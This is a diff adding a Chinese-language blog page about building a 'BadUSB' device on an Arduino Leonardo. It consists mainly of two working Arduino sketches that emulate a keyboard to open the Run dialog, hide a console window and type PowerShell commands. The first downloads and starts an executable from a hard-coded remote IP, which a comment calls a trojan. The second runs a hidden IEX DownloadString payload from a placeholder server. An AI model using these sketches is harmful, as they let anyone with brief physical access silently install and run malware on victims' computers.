@@ -1,0 +1,192 @@
+<!DOCTYPE html>
+<html lang="en">
+<head><meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<link href="https://fonts.googleapis.com/css?family=Nunito+Sans:400,400i,700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="/assets/css/style.css">
+<title>badusb</title>
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>badusb | yzyBlog</title>
+<meta name="generator" content="Jekyll v4.3.2" />
+<meta property="og:title" content="badusb" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="badusb 制作" />
+<meta property="og:description" content="badusb 制作" />
+<link rel="canonical" href="http://localhost:4000/pwn/bin/2022/08/23/badusb.html" />
+<meta property="og:url" content="http://localhost:4000/pwn/bin/2022/08/23/badusb.html" />
+<meta property="og:site_name" content="yzyBlog" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2022-08-23T21:06:29+08:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="badusb" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2022-08-23T21:06:29+08:00","datePublished":"2022-08-23T21:06:29+08:00","description":"badusb 制作","headline":"badusb","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/pwn/bin/2022/08/23/badusb.html"},"url":"http://localhost:4000/pwn/bin/2022/08/23/badusb.html"}</script>
+<!-- End Jekyll SEO tag -->
+</head>
+<body>
+  <header class="texture-blue">
+    <div class="container"><div class="navbar">
+	<ul>
+		
+		<a href="https://yzy666699.github.io"><li  >HOME</li></a>
+		
+		<a href="/resume"><li  >Resume</li></a>
+		
+	</ul>
+</div></div><div class="container">
+	<h1>badusb</h1>
+	<h4 class="post-description"></h4>
+	<div class="post-date" style="margin-top:20px">
+		Published on Aug 23, 2022
+	</div>
+	<ul class="post-tags"><li>pwn</li><li>bin</li></ul>
+</div>
+</header>
+  <main>
+    <div class="container">
+      <div class="post-container">
+          <h1 id="badusb-制作">badusb 制作</h1>
+
+<h2 id="下载arduino-ide">下载arduino ide</h2>
+
+<p>官网下载arduino ide（www.arduino.cc）</p>
+
+<h2 id="编译badusb代码">编译badusb代码</h2>
+
+<p>1.实现下载执行</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span><span class="cpf">&lt;Keyboard.h&gt;</span><span class="c1"> </span><span class="cp">
+</span><span class="kt">void</span> <span class="nf">setup</span><span class="p">()</span> <span class="p">{</span>
+<span class="c1">// putpower shell your setup code here, to run once</span>
+<span class="n">Keyboard</span><span class="p">.</span><span class="n">begin</span><span class="p">();</span><span class="c1">//开始键盘通讯 </span>
+<span class="n">delay</span><span class="p">(</span><span class="mi">1500</span><span class="p">);</span><span class="c1">//延时 </span>
+<span class="n">Keyboard</span><span class="p">.</span><span class="n">press</span><span class="p">(</span><span class="n">KEY_LEFT_GUI</span><span class="p">);</span><span class="c1">//win键 </span>
+<span class="n">delay</span><span class="p">(</span><span class="mi">500</span><span class="p">);</span>
+<span class="n">Keyboard</span><span class="p">.</span><span class="n">press</span><span class="p">(</span><span class="sc">'r'</span><span class="p">);</span><span class="c1">//r键</span>
+<span class="n">delay</span><span class="p">(</span><span class="mi">500</span><span class="p">);</span> 
+<span class="n">Keyboard</span><span class="p">.</span><span class="n">release</span><span class="p">(</span><span class="n">KEY_LEFT_GUI</span><span class="p">);</span>
+<span class="n">Keyboard</span><span class="p">.</span><span class="n">release</span><span class="p">(</span><span class="sc">'r'</span><span class="p">);</span>
+<span class="n">Keyboard</span><span class="p">.</span><span class="n">press</span><span class="p">(</span><span class="n">KEY_CAPS_LOCK</span><span class="p">);</span><span class="c1">//利用开大写输小写绕过输入法</span>
+<span class="n">Keyboard</span><span class="p">.</span><span class="n">release</span><span class="p">(</span><span class="n">KEY_CAPS_LOCK</span><span class="p">);</span>
+<span class="n">delay</span><span class="p">(</span><span class="mi">500</span><span class="p">);</span>
+<span class="n">Keyboard</span><span class="p">.</span><span class="n">println</span><span class="p">(</span><span class="s">"CMD /T:01 /K @echo off &amp;&amp; mode con:COLS=15 LINES=1"</span><span class="p">);</span>   <span class="c1">//使用最小化隐藏cmd窗口</span>
+<span class="c1">//cmd /c start /minCMD /C START /MIN POWERSHELL -W HIDDEN</span>
+<span class="n">delay</span><span class="p">(</span><span class="mi">500</span><span class="p">);</span>
+<span class="n">Keyboard</span><span class="p">.</span><span class="n">press</span><span class="p">(</span><span class="n">KEY_RETURN</span><span class="p">);</span> 
+<span class="n">Keyboard</span><span class="p">.</span><span class="n">release</span><span class="p">(</span><span class="n">KEY_RETURN</span><span class="p">);</span> 
+<span class="n">delay</span><span class="p">(</span><span class="mi">500</span><span class="p">);</span>
+<span class="c1">//Keyboard.println("mkdir C:\\test");</span>
+<span class="c1">//Keyboard.press(KEY_RETURN); </span>
+<span class="c1">//Keyboard.release(KEY_RETURN); </span>
+<span class="c1">//delay(1300);</span>
+<span class="n">Keyboard</span><span class="p">.</span><span class="n">println</span><span class="p">(</span><span class="s">"powershell"</span><span class="p">);</span>
+<span class="n">Keyboard</span><span class="p">.</span><span class="n">println</span><span class="p">(</span><span class="s">"$clnt = new-object system.net.webclient;"</span><span class="p">);</span>
+<span class="n">Keyboard</span><span class="p">.</span><span class="n">println</span><span class="p">(</span><span class="s">"$url= 'http://216.83.59.98:8888/down/pu3vURICJ31l';"</span><span class="p">);</span>  <span class="c1">//xxx为你服务器ip，b.ps1为生成的木马文件</span>
+<span class="n">Keyboard</span><span class="p">.</span><span class="n">println</span><span class="p">(</span><span class="s">"$file = 'C:</span><span class="se">\\</span><span class="s">Users</span><span class="se">\\</span><span class="s">Public</span><span class="se">\\</span><span class="s">Downloads</span><span class="se">\\</span><span class="s">list.exe';"</span><span class="p">);</span>     
+<span class="n">Keyboard</span><span class="p">.</span><span class="n">println</span><span class="p">(</span><span class="s">"$clnt.downloadfile($url,$file);start-process C:</span><span class="se">\\</span><span class="s">Users</span><span class="se">\\</span><span class="s">Public</span><span class="se">\\</span><span class="s">Downloads</span><span class="se">\\</span><span class="s">list.exe"</span><span class="p">);</span>  
+<span class="c1">//Keyboard.println("powershell.exe -executionpolicy bypass -file  C:\\Users\\Public\\Downloads\\list.exe"); </span>
+<span class="n">Keyboard</span><span class="p">.</span><span class="n">press</span><span class="p">(</span><span class="n">KEY_RETURN</span><span class="p">);</span> 
+<span class="n">Keyboard</span><span class="p">.</span><span class="n">release</span><span class="p">(</span><span class="n">KEY_RETURN</span><span class="p">);</span>
+<span class="c1">//delay(3400);</span>
+<span class="c1">//Keyboard.press(KEY_LEFT_GUI);//win键 </span>
+<span class="c1">//delay(500);</span>
+<span class="c1">//Keyboard.press('r');//r键</span>
+<span class="c1">//delay(500); </span>
+<span class="c1">//Keyboard.release(KEY_LEFT_GUI);</span>
+<span class="c1">//Keyboard.release('r');</span>
+<span class="c1">//delay(500);</span>
+<span class="c1">//Keyboard.println("taskkill /t /im conhost.exe /f");</span>
+<span class="c1">//Keyboard.press(KEY_CAPS_LOCK);</span>
+<span class="c1">//Keyboard.release(KEY_CAPS_LOCK);</span>
+<span class="n">Keyboard</span><span class="p">.</span><span class="n">end</span><span class="p">();</span><span class="c1">//结束键盘通讯 </span>
+<span class="p">}</span>
+<span class="kt">void</span> <span class="nf">loop</span><span class="p">()</span> <span class="p">{</span>
+  <span class="c1">// put your main code here, to run repeatedly:</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>2.模拟鼠标键盘</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;Mouse.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;Keyboard.h&gt;</span><span class="c1"> </span><span class="cp">
+</span><span class="kt">long</span> <span class="n">basic</span><span class="p">;</span>
+<span class="kt">long</span> <span class="n">x</span><span class="p">;</span>
+<span class="kt">long</span> <span class="n">y</span><span class="p">;</span>
+<span class="n">String</span> <span class="n">powershell</span><span class="p">;</span>
+
+<span class="kt">void</span> <span class="nf">setup</span><span class="p">()</span>
+<span class="p">{</span>
+  <span class="n">basic</span><span class="o">=</span><span class="mi">9999999</span><span class="p">;</span> 
+  <span class="n">x</span><span class="o">=</span><span class="mi">5000000</span><span class="p">;</span>
+  <span class="n">y</span><span class="o">=</span><span class="mi">5000000</span><span class="p">;</span>
+  <span class="n">powershell</span><span class="o">=</span><span class="s">"powershell.exe  -WindowStyle Hidden -NoLogo  IEX (New-Object Net.WebClient).DownloadString('http://xxx.xxx.xxx.xxx/badusb/test.txt');"</span><span class="p">;</span>
+  
+  <span class="n">Keyboard</span><span class="p">.</span><span class="n">begin</span><span class="p">();</span>
+  <span class="n">Mouse</span><span class="p">.</span><span class="n">begin</span><span class="p">();</span>
+
+  <span class="n">keyboard_gui</span><span class="p">();</span>
+  <span class="n">keyboard_powershell</span><span class="p">();</span>
+  <span class="n">mouse</span><span class="p">();</span>
+
+  <span class="n">Mouse</span><span class="p">.</span><span class="n">end</span><span class="p">();</span>
+  <span class="n">Keyboard</span><span class="p">.</span><span class="n">end</span><span class="p">();</span>
+<span class="p">}</span>
+<span class="kt">void</span> <span class="nf">keyboard_gui</span><span class="p">()</span>
+<span class="p">{</span>
+  <span class="n">Keyboard</span><span class="p">.</span><span class="n">begin</span><span class="p">();</span>
+  <span class="n">delay</span><span class="p">(</span><span class="mi">1000</span><span class="p">);</span>
+  <span class="n">delay</span><span class="p">(</span><span class="mi">500</span><span class="p">);</span>
+  <span class="n">Keyboard</span><span class="p">.</span><span class="n">press</span><span class="p">(</span><span class="n">KEY_LEFT_GUI</span><span class="p">);</span> 
+  <span class="n">delay</span><span class="p">(</span><span class="mi">500</span><span class="p">);</span> 
+  <span class="n">Keyboard</span><span class="p">.</span><span class="n">press</span><span class="p">(</span><span class="sc">'r'</span><span class="p">);</span>
+  <span class="n">delay</span><span class="p">(</span><span class="mi">500</span><span class="p">);</span> 
+  <span class="n">Keyboard</span><span class="p">.</span><span class="n">releaseAll</span><span class="p">();</span>
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="nf">keyboard_powershell</span><span class="p">()</span>
+<span class="p">{</span>
+  <span class="n">Keyboard</span><span class="p">.</span><span class="n">println</span><span class="p">(</span><span class="n">powershell</span><span class="p">);</span>
+  <span class="n">delay</span><span class="p">(</span><span class="mi">500</span><span class="p">);</span> 
+  <span class="n">Keyboard</span><span class="p">.</span><span class="n">press</span><span class="p">(</span><span class="n">KEY_RETURN</span><span class="p">);</span>
+  <span class="n">delay</span><span class="p">(</span><span class="mi">500</span><span class="p">);</span> 
+  <span class="n">Keyboard</span><span class="p">.</span><span class="n">release</span><span class="p">(</span><span class="n">KEY_RETURN</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="nf">mouse</span><span class="p">()</span>
+<span class="p">{</span>
+  <span class="n">delay</span><span class="p">(</span><span class="mi">500</span><span class="p">);</span>
+  <span class="n">Mouse</span><span class="p">.</span><span class="n">move</span><span class="p">(</span><span class="o">-</span><span class="n">basic</span><span class="p">,</span><span class="o">-</span><span class="n">basic</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
+  <span class="n">Mouse</span><span class="p">.</span><span class="n">move</span><span class="p">(</span><span class="o">-</span><span class="n">basic</span><span class="p">,</span><span class="o">-</span><span class="n">basic</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
+  <span class="n">Mouse</span><span class="p">.</span><span class="n">move</span><span class="p">(</span><span class="o">-</span><span class="n">basic</span><span class="p">,</span><span class="o">-</span><span class="n">basic</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
+  <span class="n">Mouse</span><span class="p">.</span><span class="n">move</span><span class="p">(</span><span class="o">-</span><span class="n">basic</span><span class="p">,</span><span class="o">-</span><span class="n">basic</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
+  <span class="n">Mouse</span><span class="p">.</span><span class="n">move</span><span class="p">(</span><span class="o">-</span><span class="n">basic</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
+  <span class="n">Mouse</span><span class="p">.</span><span class="n">move</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="o">-</span><span class="n">basic</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>  
+  <span class="n">Mouse</span><span class="p">.</span><span class="n">move</span><span class="p">(</span><span class="n">basic</span><span class="p">,</span><span class="n">basic</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
+  <span class="n">Mouse</span><span class="p">.</span><span class="n">move</span><span class="p">(</span><span class="n">basic</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
+  <span class="n">Mouse</span><span class="p">.</span><span class="n">move</span><span class="p">(</span><span class="n">x</span><span class="p">,</span><span class="n">y</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span> 
+  <span class="n">Mouse</span><span class="p">.</span><span class="n">click</span><span class="p">();</span>
+  <span class="n">delay</span><span class="p">(</span><span class="mi">500</span><span class="p">);</span>
+  <span class="n">Mouse</span><span class="p">.</span><span class="n">click</span><span class="p">();</span>
+  <span class="n">delay</span><span class="p">(</span><span class="mi">500</span><span class="p">);</span>
+  <span class="n">Mouse</span><span class="p">.</span><span class="n">click</span><span class="p">();</span>
+<span class="p">}</span>
+
+
+<span class="kt">void</span> <span class="nf">loop</span><span class="p">()</span> <span class="p">{}</span>
+</code></pre></div></div>
+
+<h2 id="编译连接">编译连接</h2>
+
+<p><img src="C:\Users\17290\OneDrive\桌面\博客文章\photo\image-20230902210200875.png" alt="image-20230902210200875" /></p>
+
+<p>开发板：arduino leonardo</p>
+
+<p>端口：com3</p>
+
+
+      </div>
+
+        <!-- Configure Disqus --></div>
+  </main></body>
+</html>
